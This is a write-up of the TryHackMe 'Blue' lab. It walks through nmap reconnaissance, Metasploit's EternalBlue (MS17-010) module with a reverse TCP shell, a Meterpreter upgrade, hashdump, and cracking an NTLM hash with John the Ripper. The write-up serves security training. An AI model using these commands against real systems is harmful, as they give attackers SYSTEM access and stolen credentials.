# Blue — TryHackMe — Easy

> **Date:** 2026-05-27 **Platform:** TryHackMe **Difficulty:** Easy **Tags:** `#windows` `#smb` `#eternalblue` `#ms17-010` `#metasploit` `#hashdump`

## Summary

Windows 7 SP1 machine vulnerable to EternalBlue (MS17-010). Initial access obtained via Metasploit's eternalblue module, gaining a direct NT AUTHORITY\SYSTEM shell. Shell upgraded to Meterpreter, then hashdump used to extract NTLM hashes. Jon's password cracked via wordlist attack.

---

## Reconnaissance

### Nmap scan

```bash
nmap -sC -sV -oN blue.txt 10.113.190.89
```

**Open ports:**

|Port|Service|Version|
|---|---|---|
|135|MSRPC|Microsoft Windows RPC|
|139|NetBIOS|Microsoft Windows netbios-ssn|
|445|SMB|Windows 7 Professional SP1|

**Notable findings:**

- OS: **Windows 7 Professional 7601 Service Pack 1**
- Hostname: **JON-PC**
- SMB message signing: **disabled**

## Enumeration

```bash
nmap -p 445 --script=smb-vuln-ms17-010 10.113.190.89
```

## Exploitation

### EternalBlue — MS17-010

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.113.190.89
set LHOST 10.113.152.9
set payload windows/x64/shell/reverse_tcp
run
```

**Result:** Shell as `NT AUTHORITY\SYSTEM` ✅ — no privesc needed

### Upgrade to Meterpreter

```bash
# Background the shell
CTRL + Z

use post/multi/manage/shell_to_meterpreter
set SESSION 1
run

# Interact with Meterpreter session
sessions -i 2
```

### Password Cracking

```bash
echo "ffb43f0de35be4d9917ac0cc8ad57f8d" > hash.txt
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Lessons Learned

**1.** Windows 7 SP1 with SMB port 445 open is an immediate indicator of EternalBlue — always run `smb-vuln-ms17-010` script during recon.

**2.** EternalBlue gives direct SYSTEM access — one of the most critical CVEs in history, still found on unpatched machines in real engagements.

**3.** `hashdump` in Meterpreter extracts all NTLM hashes — these can be cracked offline with john/hashcat or used directly in Pass-the-Hash attacks.
